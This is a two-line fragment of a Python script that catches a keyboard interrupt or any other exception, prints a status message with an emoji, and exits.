    except KeyboardInterrupt: print("\n🛑 Stopped."); sys.exit(0)
    except Exception as e: print(f"\n❌ Error: {e}"); sys.exit(1)